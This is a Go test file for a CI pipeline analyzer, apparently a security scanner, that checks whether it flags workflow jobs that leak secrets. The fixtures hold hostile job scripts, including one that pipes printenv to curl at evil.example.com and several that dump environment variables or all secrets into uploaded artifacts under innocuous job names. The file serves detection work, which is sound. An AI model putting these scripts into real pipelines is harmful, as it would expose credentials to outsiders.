package analyze

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestWorkflowExfil_DisguisedArtifactOnly(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "code-format",
			Script: []string{"printenv > results.txt"},
			Artifacts: map[string]any{
				"paths": []any{"results.txt"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, WorkflowArtifactExfilID) {
		t.Fatalf("expected %s, got: %v", WorkflowArtifactExfilID, findingIDs(findings))
	}
}

func TestWorkflowExfil_DisguisedHTTP(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "security-scan",
			Script: []string{"printenv | curl -X POST -d @- https://evil.example.com/exfil"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, WorkflowSecretExfilID) {
		t.Fatalf("expected %s, got: %v", WorkflowSecretExfilID, findingIDs(findings))
	}
}

func TestWorkflowExfil_PersistentArtifactNonDisguised(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "dump-env",
			Script: []string{"printenv > /tmp/env.txt"},
			Artifacts: map[string]any{
				"paths": []any{"/tmp/env.txt"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, WorkflowArtifactExfilID) {
		t.Fatalf("expected %s for non-disguised persistent artifact, got: %v", WorkflowArtifactExfilID, findingIDs(findings))
	}
}

func TestWorkflowExfil_PushTriggered(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "exfil-job",
			Script: []string{"printenv"},
			Rules: []any{
				map[string]any{"if": "$CI_PIPELINE_SOURCE == 'push'"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, WorkflowSecretExfilID) {
		t.Fatalf("expected %s for push-triggered env dump, got: %v", WorkflowSecretExfilID, findingIDs(findings))
	}
}

func TestWorkflowExfil_LegitLintJob(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "lint",
			Script: []string{"eslint . --format json --output-file lint-results.json"},
			Artifacts: map[string]any{
				"paths":     []any{"lint-results.json"},
				"expire_in": "1 week",
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, WorkflowSecretExfilID) || hasFindingID(findings, WorkflowArtifactExfilID) {
		t.Fatalf("expected no workflow exfil findings for legit lint job, got: %v", findingIDs(findings))
	}
}

func TestWorkflowExfil_ToJSONSecrets(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "diagnostics",
			Script: []string{"echo ${{ toJSON(secrets) }} > secrets.json"},
			Artifacts: map[string]any{
				"paths": []any{"secrets.json"},
			},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, WorkflowArtifactExfilID) {
		t.Fatalf("expected %s for toJSON(secrets), got: %v", WorkflowArtifactExfilID, findingIDs(findings))
	}
}
